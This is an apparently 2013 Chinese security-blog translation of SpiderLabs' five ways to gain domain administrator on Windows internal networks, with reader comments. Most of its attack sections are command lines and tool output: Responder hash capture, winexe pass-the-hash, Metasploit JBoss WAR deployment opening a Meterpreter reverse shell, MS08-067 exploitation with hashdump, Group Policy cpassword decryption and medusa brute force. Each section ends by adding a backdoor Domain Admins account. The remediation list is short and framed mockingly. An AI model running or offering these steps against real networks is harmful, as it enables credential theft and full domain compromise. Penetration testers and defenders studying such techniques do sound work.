@@ -1,0 +1,383 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">得到内网域管理员的5种常见方法</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">mickey</a> <span class="bull">·</span> <time title="2013/09/26 12:11" ui-time="" datetime="2013/09/26 12:11" class="published ng-binding ng-isolate-scope">2013/09/26 12:11</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>from:<a href="http://blog.spiderlabs.com/2013/09/top-five-ways-spiderlabs-got-domain-admin-on-your-internal-network.html">http://blog.spiderlabs.com/2013/09/top-five-ways-spiderlabs-got-domain-admin-on-your-internal-network.html</a></p><p>spiderlabs总结的,我简单翻译下,偶尔加点我的牢骚。</p><h2>1.Netbios and LLMNR Name Poisoning</h2><hr><p>这个方法在WIN工作组下渗透很有用,WIN的请求查询顺序是下面三个步骤:本地hosts文件(<code>%windir%\System32\drivers\etc\hosts</code>),DNS服务器,NetBIOS广播,如果前2个请求失败,则在本地发送NetBIOS广播请求,此时任何本地网络的系统都能回答这个请求,使用SpiderLabs出品的Responder工具,能够在不借助ARP欺骗的情况下,响应这个请求.其实metasploit也能利用(<a href="http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html">http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html</a>),但实际测试还是Responder比较好,都是套用标准库写的,很方便在目标上使用:)</p><pre><code>~/Responder# python Responder.py -i 192.168.8.25
+NBT Name Service/LLMNR Answerer 1.0.
+Please send bugs/comments to: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="90fcf7f1f6f6f9f5d0e4e2e5e3e4e7f1e6f5bef3fffd">[email&#160;protected]</a>
+To kill this script hit CRTL-C
+[+]NBT-NS &amp; LLMNR responder started
+Global Parameters set:
+Challenge set is: 1122334455667788
+WPAD Proxy Server is:OFF
+HTTP Server is:ON
+HTTPS Server is:ON
+SMB Server is:ON
+SMB LM support is set to:0
+SQL Server is:ON
+FTP Server is:ON
+DNS Server is:ON
+LDAP Server is:ON
+FingerPrint Module is:OFF
+
+LLMNR poisoned answer sent to this IP: 192.168.8.112. The requested name was : wpad.
+LLMNR poisoned answer sent to this IP: 192.168.8.112. The requested name was : wpad.
+LLMNR poisoned answer sent to this IP: 192.168.8.12. The requested name was : 110.
+…snip…
+
+NBT-NS Answer sent to: 192.168.8.6
+[+]SMB-NTLMv2 hash captured from : 192.168.8.6
+Domain is : BEACONHILLSHIGH
+User is : smccall
+[+]SMB complete hash is : smccall::BEACONHILLSHIGH:1122334455667788:reallylonghash
+Share requested: \\ECONOMY309\IPC$
+…snip...
+
+LLMNR poisoned answer sent to this IP: 192.168.8.11. The requested name was : wpad.
+[+]SMB-NTLMv2 hash captured from : 192.168.8.11
+Domain is : BEACONHILLSHIGH
+User is : lmartin
+[+]SMB complete hash is : lmartin:: BEACONHILLSHIGH:1122334455667788:reallylonghash
+Share requested: \\ADVCHEM\311IPC$
+…snip…
+</code></pre><p>这里的LM, NTLMv1, or NTLMv2哈希,能够用GPU或者彩虹表暴力破解.如果在responder会话过程中,抓到一个域管理员帐号,能够直接使用winexe运行cmd.exe命令</p><pre><code>~/work/nmap# ~/SpiderLabs/winexe-PTH -U BEACONHILLSHIGH\\smccall%allison --uninstall --system //192.168.8.6 cmd.exe 
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+C:\WINDOWS\system32&gt;net user twadmin $piD3rsRul3! /add /domain
+net user twadmin $piD3rsRul3! /add /domain
+The request will be processed at a domain controller for domain beaconhillshigh.edu.
+The command completed successfully.
+C:\WINDOWS\system32&gt; net group "Domain Admins" twadmin /add /domain
+net group "Domain Admins" twadmin /add /domain
+The request will be processed at a domain controller for domain beaconhillshigh.edu.
+The command completed successfully.
+</code></pre><h2>2.利用jboss漏洞</h2><hr><p>可以前期先用nmap扫描下端口,识别出常见的JAVA应用服务器,后期配合Metasploit的auxiliary模块来利用.比如jboss漏洞.最常见的就是弱口令了吧,同理的,也可以寻找webloigc,websphere,tomcat等这些基于JAVA的应用服务器,还有最近国内政府部门部署比较多的Apusic,不过需要注意war包格式,进后台,直接部署WAR就行了.jboss的除了弱口令,还有个后台绕过,和流传很久的1337那个.用例说下如何用metasploit暴力破解jboss后台,以及部署war包.</p><pre><code>msfcli auxiliary/scanner/http/dir_scanner THREADS=25 RHOSTS=file:./8080 DICTIONARY=./http.scan.list RPORT=8080 E &gt;&gt; http.jboss.8080
+~/work/nmap# cat http.jboss.8080     &lt;-- 这个是开25线程字典跑8080端口jboss后台的
+[*] Initializing modules... 
+THREADS =&gt; 25 
+RHOSTS =&gt; file:./8080 
+DICTIONARY =&gt; ./http.scan.list 
+RPORT =&gt; 8080 
+[*] Detecting error code 
+[*] Detecting error code 
+[*] Detecting error code 
+[*] Detecting error code 
+[*] Using code '404' as not found for 192.168.5.18 
+[*] Using code '404' as not found for 192.168.5.21 
+[*] Using code '404' as not found for 192.168.5.20 
+[*] Found http://192.168.5.20:8080/web-console/ 401 (192.168.5.20) 
+[*] http://192.168.5.20:8080/web-console/ requires authentication: Basic realm="JBoss JMX Console" 
+[*] Found http://192.168.5.20:8080/web-console/ 404 (192.168.5.20) 
+[*] Found http://192.168.5.20:8080/jmx-console/ 401 (192.168.5.20) 
+[*] http://192.168.5.20:8080/jmx-console/ requires authentication: Basic realm="JBoss JMX Console" 
+[*] Found http://192.168.5.21:8080/jmx-console/ 404 (192.168.5.21) 
+[*] Scanned 4 of 4 hosts (100% complete) 
+[*] Auxiliary module execution completed
+
+
+
+Output from use auxiliary/scanner/http/jboss_vulnscan:
+[*] 192.168.5.20:8080 /jmx-console/HtmlAdaptor requires authentication (401): Basic realm="JBoss JMX Console" 
+[*] 192.168.5.20:8080 Check for verb tampering (HEAD) 
+[+] 192.168.5.20:8080 Got authentication bypass via HTTP verb tampering 
+[+] 192.168.5.20:8080 Authenticated using admin:admin 
+[+] 192.168.5.20:8080 /status does not require authentication (200) 
+[+] 192.168.5.20:8080 /web-console/ServerInfo.jsp does not require authentication (200) 
+[+] 192.168.5.20:8080 /web-console/Invoker does not require authentication (200) 
+[+] 192.168.5.20:8080 /invoker/JMXInvokerServlet does not require authentication (200)
+
+
+
+Output from use exploit/multi/http/jboss_maindeployer:          &lt;--部署war包
+msf exploit(jboss_maindeployer) &gt; exploit
+
+[*] Started reverse handler on 192.168.5.233:4444
+[*] Sorry, automatic target detection doesn't work with HEAD requests 
+[*] Automatically selected target "Java Universal" 
+[*] Starting up our web service on http://192.168.5.233:1337/HlusdqEcokvXH.war ... 
+[*] Using URL: http:// 192.168.5.233:1337/HlveuqEzrovXH.war 
+[*] Asking the JBoss server to deploy (via MainDeployer) http://192.168.5.233:1337/HlusdqEcokvXH.war [*] Sending the WAR archive to the server... 
+[*] Sending the WAR archive to the server... 
+[*] Waiting for the server to request the WAR archive.... 
+[*] Shutting down the web service... 
+[*] Executing HlusdqEcokvXH... 
+[+] Successfully triggered payload at '/HlusdqEcokvXH/ewNYTEdFnYdcaOl.jsp' 
+[*] Undeploying HlusdqEcokvXH... 
+[*] Sending stage (30355 bytes) to 192.168.5.159 
+[*] Meterpreter session 1 opened (192.168.5.233:4444 -&gt; 192.168.5.20:4209) at 2013-09-15 19:00:06 -0600
+
+meterpreter &gt; sysinfo 
+Computer : BHHSMOFF011 
+OS : Windows 2003 5.2 (x86) 
+Meterpreter : java/java
+
+meterpreter &gt; shell 
+Process 1 created. 
+Channel 1 created. 
+Microsoft Windows XP [Version 5.1.2600] 
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\DELLBAC\EJBContainer\bin&gt;whoami 
+whoami 
+beaconhillshigh\backup_admin
+
+C:\&gt;net user twadmin $piD3rsRul3! /add /domain 
+net user twadmin $piD3rsRul3! /add /domain 
+The request will be processed at a domain controller for domain beaconhillshigh.edu.
+
+The command completed successfully.
+
+C:\&gt;net group "Domain Admins" twadmin /add /domain 
+net group "Domain Admins" twadmin /add /domain 
+The request will be processed at a domain controller for domain beaconhillshigh.edu.
+
+The command completed successfully.
+</code></pre><h2>3.MS08-067</h2><hr><p>这个漏洞已经超过4年了,但是内网中还是有很多机器没有打补丁,影响的有(Windows Server 2000, Windows Server 2003, and Windows XP),不过说实话,我内网渗透的过程中很少用MS08-067,因为溢出不好,有可能造成DOS,被人发现了,就不好了,你懂得.</p><pre><code>nmap --script=smb-check-vulns.nse -v -v -p 445,139 -iL smb -oA ms08 less ms08.nmap &lt;-- 使用NMAP的smb-check-vulns脚本识别下
+...snip...
+Nmap scan report for shelob-squared (192.168.1.103) 
+Host is up (0.00042s latency). 
+Scanned at 2013-09-16 21:52:32 CDT for 55s 
+PORT STATE SERVICE 
+139/tcp open netbios-ssn 
+445/tcp open microsoft-ds 
+MAC Address: 00:0C:29:E3:25:78 (VMware)
+
+Host script results: 
+| smb-check-vulns: 
+| MS08-067: VULNERABLE      &lt;--bingo..有漏洞
+| Conficker: Likely CLEAN 
+| SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE 
+| MS06-025: NO SERVICE (the Ras RPC service is inactive) 
+|_ MS07-029: NO SERVICE (the Dns Server RPC service is inactive)
+...snip...
+</code></pre><p>nmap的NSE脚本是用LUA语言写的,把这些NSE都过一遍,对渗透很有帮助哦,尤其是在LINUX平台,win平台下除了有几种扫描方式利用不了,NSE脚本照样可以用,不过LINUX上默认安装的NMAP版本都比较低了,你不能直接放NSE到目录,注意看库之间的依赖关系,才能利用,上次看wooyun的drops,<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e5898c93809796004142026c7e007e7b004168036d74015e49025e61027f61a48b918d97a5bd026c7e027f61ac8b968c828d91b686848bcb959c">[email&#160;protected]</a>,说用nse也实现了一个,我只想说,你能偷偷发我一份吗?</p><p>接下来,还是用metasploit溢出，不知道对中文系统效果怎么样，我没有试过 =.=</p><pre><code>msf &gt; use windows/smb/ms08_067_netapi 
+msf exploit(ms08_067_netapi) &gt; set RHOST 192.168.1.103 
+RHOST =&gt; 192.168.1.103 
+msf exploit(ms08_067_netapi) &gt; set TARGET 0 
+TARGET =&gt; 0 
+msf exploit(ms08_067_netapi) &gt; set LHOST 192.168.1.215 
+LHOST =&gt; 192.168.1.215 
+msf exploit(ms08_067_netapi) &gt; set PAYLOAD windows/meterpreter/bind_tcp 
+PAYLOAD =&gt; windows/meterpreter/bind_tcp 
+msf exploit(ms08_067_netapi) &gt; exploit
+
+[*] Started bind handler 
+[*] Automatically detecting the target... 
+[*] Fingerprint: Windows XP - Service Pack 2 - lang:English 
+[*] Selected Target: Windows XP SP2 English (AlwaysOn NX) 
+[*] Attempting to trigger the vulnerability... 
+[*] Sending stage (752128 bytes) to 192.168.1.103 
+[*] Meterpreter session 1 opened (192.168.1.215:33354 -&gt; 192.168.1.103:4444) at 2013-09-16 21:54:15 -0500
+
+meterpreter &gt; getsystem 
+...got system (via technique 1). 
+meterpreter &gt; sysinfo 
+Computer : SHELOB-SQUARED 
+OS : Windows XP (Build 2600, Service Pack 2). 
+Architecture : x86 
+System Language : en_US 
+Meterpreter : x86/win32
+
+meterpreter &gt; run hashdump 
+[*] Obtaining the boot key... 
+[*] Calculating the hboot key using SYSKEY 48c76bfa334c4c21edd1154db541c2c2... 
+[*] Obtaining the user list and keys... 
+[*] Decrypting user keys... 
+[*] Dumping password hints...
+
+Frodo:"what do i have" 
+Samwise:"Frodo" 
+Stryder:"love" 
+Legolas:"favorite saying" 
+Gimli:"what am i" 
+Boromir:"what I am" 
+Gandalf:"moria"
+
+[*] Dumping password hashes... 
+Administrator:500:f75d090d8564fd334a3b108f3fa6cb6d:3019d5d61cdf713c7b677efefc22f0e5::: 
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
+HelpAssistant:1000:7e8a50750d9a1a30d3d4a83f88ea86ab:6fba9c0f469be01bab209ee2785a818d::: 
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:861165412001ece0a5e73ab8863129d8::: 
+Frodo:1003:74052b0fb3d802a3be4db4ed34a95891:a7cee25799f518f9bd886683a13ed6d0::: 
+Samwise:1004:aad3b435b51404eeaad3b435b51404ee:7dff81410af5e2d0c2b6e54a98a8f622::: 
+Stryder:1005:825f8bc99c2a5013e72c57ef50f76a05:1047f0b952cfbffbdd6c34ef6bd610e5::: 
+Legolas:1006:625d787db20f1dd8aad3b435b51404ee:cc5b9f225e569fa3a2534be394df531a::: 
+Gimli:1007:aad3b435b51404eeaad3b435b51404ee:e4d2534368ff0f1cbe2a42c5d79b9818::: 
+Boromir:1008:e3bee25ac9de68cec2cc282901fd62d9:4231db4c15025d1951f3c0d39d8656a2::: 
+Gandalf:1009:20ef2c7725e35c1dbd7cfc62789a58c8:02d0a4d2b6c7d485a935778eb90e0446:::
+
+meterpreter &gt; shell 
+Process 2708 created. 
+Channel 1 created. 
+Microsoft Windows XP [Version 5.1.2600] 
+(C) Copyright 1985-2001 Microsoft Corp. 
+
+C:\ WINDOWS\system32&gt;whoami 
+whoami 
+MIRKWOOD\Gandalf
+
+C:\WINDOWS\system32&gt;net user twadmin $piD3rsRul3! /add /domain 
+The request will be processed at a domain controller for domain MIRKWOOD.
+
+The command completed successfully.
+
+C:\WINDOWS\system32&gt;net group "Domain Admins" twadmin /add /domain 
+net group "Domain Admins" twadmin /add /domain 
+The request will be processed at a domain controller for domain MIRKWOOD.
+
+The command completed successfully.
+</code></pre><h2>4. GPO cpassword</h2><hr><p>这个原理完全可以看瞌睡龙牛翻译的<a href="http://drops.wooyun.org/papers/576">http://drops.wooyun.org/papers/576</a>,本文中亮点是他从LINUX连接到WIN的,有许多同学不会通过linux渗透WIN域,尤其是在得到一个WEBSHELL,还是ROOT权限,还是跟内网连着,还有个域用户的情况下(=.=现实中哪儿有这么多好的条件让你都碰到了)</p><pre><code>smbclient -W MIRKWOOD -U ‘Legolas%orcs’ \\\\192.168.1.105\\SYSVOL    &lt;--使用smbclient连接, 支持上传下载
+Domain=[ MIRKWOOD] OS=[Windows Server 2008 R2 Standard 7600] Server=[Windows Server 2008 R2 Standard 6.1] 
+smb: \&gt; dir 
+. D 0 Wed Sep 15 15:08:37 2012
+.. D 0 Wed Sep 15 15:08:37 2012 
+mirkwood.local D 0 Wed Sep 15 15:08:37 2012
+
+48457 blocks of size 4194304. 44175 blocks available
+
+smb: \&gt; cd mirkwood.local\ 
+smb: \smirkwood.local\&gt; dir 
+. D 0 Wed Sep 15 15:13:05 2012 
+.. D 0 Wed Sep 15 15:13:05 2012 
+Policies D 0 Tue Oct 30 10:29:31 2012 
+scripts D 0 Thu Nov 8 12:50:21 2012
+
+smb:\&gt; recurse
+smb:\&gt; prompt off 
+smb:\&gt; mget Policies 
+…snip…
+
+getting file \mirkwood\Policies\PolicyDefinitions\access32.admx of size 98874 as access32.admx (3657.0 KiloBytes/sec) (average 3657.0 KiloBytes/sec) 
+getting file \ mirkwood \Policies\PolicyDefinitions\access34.admx of size 131924 as access34.admx (27324.5 KiloBytes/sec) (average 7038.2 KiloBytes/sec) 
+getting file \ mirkwood \Policies\PolicyDefinitions\ActiveXInstallService.admx of size 7217 as ActiveXInstallService.admx (2303.1 KiloBytes/sec) (average 6722.5 KiloBytes/sec) 
+getting file \ mirkwood \Policies\PolicyDefinitions\AddRmvPrograms.admx of size 7214 as AddRmvPrograms.admx (2301.6 KiloBytes/sec) (average 6446.2 KiloBytes/sec) 
+getting file \ mirkwood \Policies\PolicyDefinitions\asdf.admx of size 4249 as asdf.admx (122.0 KiloBytes/sec) (average 4940.4 KiloBytes/sec) 
+getting file \ mirkwood \Policies\PolicyDefinitions\AppCompat.admx of size 4893 as AppCompat.admx (2633.2 KiloBytes/sec) (average 4835.6 KiloBytes/sec) 
+getting file \ mirkwood \Policies\PolicyDefinitions\AttachmtMgr.admx of size 3865 as AttachmtMgr.admx (2912.5 KiloBytes/sec) (average 4752.0 KiloBytes/sec) 
+getting file \ mirkwood \Policies\PolicyDefinitions\AutoPlay.admx of size 5591 as AutoPlay.admx …snip…
+
+smb:\&gt; recurse 
+smb:\&gt; prompt off 
+smb:\&gt; mget scripts 
+…snip…
+
+smb: \avi\&gt; mget scripts 
+Get directory scripts? y 
+Get directory bin? y 
+Get file #INCLUDE.BAT? y 
+getting file \ mirkwood \scripts\bin\#INCLUDE.BAT of size 2839 as #INCLUDE.BAT (409.6 KiloBytes/sec) (average 409.7 KiloBytes/sec) 
+getting file \ mirkwood \scripts\bin\NETLOGON.BAT of size 1438 as NETLOGON.BAT (28.9 KiloBytes/sec) (average 137.7 KiloBytes/sec) 
+getting file \ mirkwood \scripts\bin\NETLOGON2.BAT of size 16781 as NETLOGON2.BAT (691.0 KiloBytes/sec) (average 566.0 KiloBytes/sec) 
+getting file \ mirkwood \scripts\bin\NETLOGON3.BAT of size 16486 as NETLOGON3.BAT (1268.5 KiloBytes/sec) (average 773.6 KiloBytes/sec) 
+getting file \ mirkwood \scripts\bin\NETLOGON4.BAT of size 17429 as NETLOGON4.BAT (1108.7 KiloBytes/sec) (average 858.8 KiloBytes/sec) 
+…snip…
+</code></pre><p>Once the files are downloaded, grep through both policies and scripts for Administrator or cpassword (either would work in this instance):</p><pre><code>grep -ri administrator .
+grep -ri cpassword .
+
+~/work/nmap/192.168.1.0-24/downloads/Policies# grep -ri administrator . 
+./{FC71D7SS-51E2-4B9D-B261-GB8C9733D433}/Machine/Preferences/Groups/Groups.xml: :&lt;Groups clsid="{3125E277-EB16-4b4c-6534-544FC6D24D26}"&gt;&lt;User clsid="{HH5F1654-51E6-4d24-9B1A-D9BFN34BA1D1}" name="Administrator (built-in)" image="2" changed="2012-12-30 12:47:25" uid="{8E2D5E22-E914-438F-SS5D-FDDA92925BB7}" userContext="0" removePolicy="0"&gt;&lt;Properties action="U" newName="" fullName="" description="" cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="0" subAuthority="RID_ADMIN" userName="Administrator (built-in)"/&gt;&lt;/User&gt;
+</code></pre><p>The cpassword is taken and run through the decryption script from http://carnal0wnage.attackresearch.com/2012/10/group-policy-preferences-and-getting.html.</p><pre><code>~/work# ruby decrypt.rb    &lt;--解密
+Local*P4ssword!
+
+~/work/nmap# ~/SpiderLabs/winexe-PTH -U MIRKWOOD\\’Administrator%Local*P4ssword!’ --uninstall --system //192.168.1.103 cmd.exe      &lt;-- winexe和win下经典工具psexec效果一样一样的
+
+Microsoft Windows [Version 5.2.3790] 
+(C) Copyright 1985-2003 Microsoft Corp.
+
+C:\WINDOWS\system32&gt; net user twadmin $piD3rsRul3! /add /domain 
+The request will be processed at a domain controller for domain MIRKWOOD.
+
+The command completed successfully.
+
+C:\WINDOWS\system32&gt;net group "Domain Admins" twadmin /add /domain net group "Domain Admins" twadmin /add /domain 
+The request will be processed at a domain controller for domain MIRKWOOD.
+
+The command completed successfully.
+</code></pre><h2>5.NetBIOS Null Enumeration Allowed on Server</h2><hr><p>其实就是说,域服务器,允许你空会话连接,然后列举账户信息,然后在破解账户,LINUX下用enum4linux.pl遍历用户,用medusa破解帐号,用winexec连接执行命令.WIN下的话,&lt;&lt;黑客大曝光>>查点那章看过木?</p><pre><code>~/enum4linux.pl -u Legolas -p orcs -w MIRKWOOD -a 192.168.1.90 &gt;&gt; enum-192.168.1.90
+
+~/work/targets/192.168.1.0-24# cat enum-192.168.1.90 
+Starting enum4linux v0.8.7 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Sep 10 10:15:14 2013
+========================== 
+| Target Information | 
+========================== 
+Target ........... 192.168.1.90 
+RID Range ........ 500-550,1000-1050 
+Username ......... '' 
+Password ......... '' 
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+=================================================== 
+| Enumerating Workgroup/Domain on 192.168.1.90 | 
+=================================================== 
+[+] Got domain/workgroup name: MIRKWOOD
+
+=========================================== 
+| Nbtstat Information for 192.168.1.90 |
+=========================================== 
+Looking up status of 192.168.1.90 
+MODOR &lt;00&gt; - M Workstation Service 
+MIRKWOOD &lt;00&gt; - M Domain/Workgroup Name 
+MIRKWOOD &lt;1c&gt; - M Domain Controllers 
+MORDOR &lt;20&gt; - M File Server Service
+
+MAC Address = B5-AD-2F-37-2G-4F
+
+==================================== 
+| Session Check on 192.168.1.90 | 
+==================================== 
+[+] Server 192.168.1.90 allows sessions using username '', password '' 
+…snip…
+
+============================ 
+| Users on 192.168.1.90 | 
+============================ 
+index: 0x2b76 RID: 0xd08 acb: 0x00000610 Account: Administrator Name: Administrator Desc: (null) 
+index: 0x1822 RID: 0xb0a acb: 0x00000414 Account: Frodo Name: Frodo Baggins Desc: (null) 
+index: 0x1bga RID: 0xc0a acb: 0x00080210 Account: Samwise Name: Samwise Gamgee User Desc: (null) 
+index: 0x1dc4 RID: 0xc7a acb: 0x00050210 Account: Stryder Name: Aragorn User Desc: (null) 
+index: 0x1823 RID: 0xb0b acb: 0x00007014 Account: Legolas Name: Legolas Greenleaf Desc: (null) 
+index: 0x1824 RID: 0xb0c acb: 0x00010014 Account: Gimli Name: Gimli son of Glóin Desc: (null) 
+index: 0x1825 RID: 0xb0d acb: 0x00300014 Account: Boromir Name: Boromir son of Denethor II Desc: (null) 
+index: 0x126f RID: 0x9eb acb: 0x00004014 Account: Gandalf Name: Gandalf the Gray Desc: (null) 
+index: 0x1826 RID: 0xb0e acb: 0x00020015 Account: gollum Name: gollum Desc: (null) 
+…snip…
+
+~/work/targets/192.168.1.90# cat enum-192.168.1.90 .txt | grep "Domain Admins" 
+Group 'Administrators' (RID: 544) has member: MIRKWOOD\Domain Admins 
+Group:[Domain Admins] rid:[0x200] 
+Group 'Domain Admins' (RID: 512) has member: MIRKWOOD \Gandalf 
+Group 'Domain Admins' (RID: 512) has member: MIRKWOOD \Stryder 
+Group 'Domain Admins' (RID: 512) has member: MIRKWOOD \Administrator 
+Group 'Domain Admins' (RID: 512) has member: MIRKWOOD \gollum 
+Group 'Domain Admins' (RID: 512) has member: MIRKWOOD \Saruman 
+S-1-5-21-8675309254-522963170-1866889882-512 MIRKWOOD \Domain Admins (Domain Group) 
+S-1-5-21-1897573695-8675309227-1212564242-512 MORDOR\Domain Admins (Domain Group)
+
+~/work/nmap/# medusa -M smbnt -H smb -u gollum -p gollum -m GROUP:DOMAIN | tee smb-gollum.medusa
+ACCOUNT CHECK: [smbnt] Host: 192.168.1.1 (1 of 62, 0 complete) User: gollum (1 of 1, 0 complete) Password: gollum (1 of 1 complete) 
+ACCOUNT FOUND: [smbnt] Host: 192.168.1.1 User: gollum Password: gollum [SUCCESS (0x000072:STATUS_ACCOUNT_DISABLED)] 
+ACCOUNT CHECK: [smbnt] Host: 192.168.1.100 (2 of 62, 1 complete) User: gollum (1 of 1, 0 complete) Password: gollum (1 of 1 complete) 
+ACCOUNT FOUND: [smbnt] Host: 192.168.1.100 User: gollum Password: gollum [SUCCESS (0x000072:STATUS_ACCOUNT_DISABLED)] 
+ACCOUNT CHECK: [smbnt] Host: 192.168.1.105 (3 of 62, 2 complete) User: gollum (1 of 1, 0 complete) Password: gollum (1 of 1 complete) 
+ACCOUNT FOUND: [smbnt] Host: 192.168.1.105 User: gollum Password: gollum [SUCCESS] 
+ACCOUNT CHECK: [smbnt] Host: 192.168.1.106 (4 of 62, 3 complete) User: gollum (1 of 1, 0 complete) Password: gollum (1 of 1 complete) 
+ACCOUNT FOUND: [smbnt] Host: 192.168.1.106 User: gollum Password: gollum [SUCCESS (0x000072:STATUS_ACCOUNT_DISABLED)] 
+ACCOUNT CHECK: [smbnt] Host: 192.168.1.107 (5 of 62, 4 complete) User: ssadmin (1 of 1, 0 complete) Password: gollum (1 of 1 complete) 
+ACCOUNT FOUND: [smbnt] Host: 192.168.1.107 User: gollum Password: gollum [SUCCESS] 
+ACCOUNT CHECK: [smbnt] Host: 192.168.1.11 (7 of 62, 6 complete) User: gollum (1 of 1, 0 complete) Password: gollum (1 of 1 complete) 
+ACCOUNT FOUND: [smbnt] Host: 192.168.1.11 User: gollum Password: gollum [SUCCESS] 
+…snip…
+
+~/work/nmap# ~/SpiderLabs/winexe-PTH -U MIRKWOOD\\gollum%gollum --uninstall --system //192.168.1.106 cmd.exe
+Microsoft Windows [Version 5.2.3790] 
+(C) Copyright 1985-2003 Microsoft Corp. 
+
+C:\ WINDOWS\system32&gt;whoami 
+whoami MIRKWOOD\gollum
+
+C:\WINDOWS\system32&gt;&gt; net user twadmin $piD3rsRul3! /add /domain 
+The request will be processed at a domain controller for domain MIRKWOOD.
+
+The command completed successfully.
+
+C:\WINDOWS\system32&gt;net group "Domain Admins" twadmin /add /domain net group "Domain Admins" twadmin /add /domain 
+The request will be processed at a domain controller for domain MIRKWOOD.
+
+The command completed successfully.
+</code></pre><h2>修补方法:[真心不希望管理员看到]</h2><hr><p>1.少用XP/win2k吧,否则为了某些兼容性,很少能全面禁止Netbios and LLMNR Name Poisoning</p><p>2.从知名站点下载软件安装程序,更换软件自带的默认口令</p><p>3.勤劳打全系统补丁</p><p>4.做好账户审核</p><p>5.禁止空会话,关键服务器,做好VLAN划分</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/9297" rel="bookmark" id="re1">巧用DSRM密码同步将域控权限持久化</a></li><li><a href="http://drops.wooyun.org/pentesting/2125" rel="bookmark" id="re2">使用LDAP查询快速提升域权限</a></li><li><a href="http://drops.wooyun.org/tips/9591" rel="bookmark" id="re3">域渗透的金之钥匙</a></li><li><a href="http://drops.wooyun.org/tips/12159" rel="bookmark" id="re4">域渗透——Pass The Ticket</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">aaa</span> <span class="reply-time">2016-06-06 16:42:31</span></div><p></p><p>@res 目测没有</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">res</span> <span class="reply-time">2016-04-25 18:54:10</span></div><p></p><p>Responder 好像不能再WIN下使用啊？有WIN下使用的版本吗</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">拨开乌云</span> <span class="reply-time">2014-12-06 17:25:17</span></div><p></p><p>mark!</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ACGT</span> <span class="reply-time">2013-10-03 16:33:32</span></div><p></p><p>哦，不好意思，是我错了，没仔细看原文</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">winsyk</span> <span class="reply-time">2013-09-29 12:13:53</span></div><p></p><p>我來補充最後一點，不要使用弱口令！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Spy4man</span> <span class="reply-time">2013-09-29 11:12:33</span></div><p></p><p>这个例子用Responder.py抓到的是half hash,只能破解，不能用于hash注入。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">insight-labs</span> <span class="reply-time">2013-09-27 19:12:19</span></div><p></p><p>碉堡了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ACGT</span> <span class="reply-time">2013-09-27 15:53:24</span></div><p></p><p>14位以下的密码，只要抓到LM hash，破解成功率100%<br>抓到的LM hash为空的话，就用抓到的域管理员hash去登录域控、DNS/DHCP/exchange server、管理员的主机，如果管理员登录过没注销，就可以抓到明文密码。<br>话说回来，有了hash就够了，有没有明文密码区别不大。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wefgod</span> <span class="reply-time">2013-09-26 16:24:05</span></div><p></p><p>哈，确实不希望管理员看见</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Spy4man</span> <span class="reply-time">2013-09-26 14:54:40</span></div><p></p><p>方法成功率也不高，因为抓到NTLM HASH后破解成功的机率太小了.现在域管理员的密码至少10位以上。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小忆</span> <span class="reply-time">2013-09-26 14:34:30</span></div><p></p><p>细节决定成败，长知识了</p><p></p></div></div></div></div></div></main>
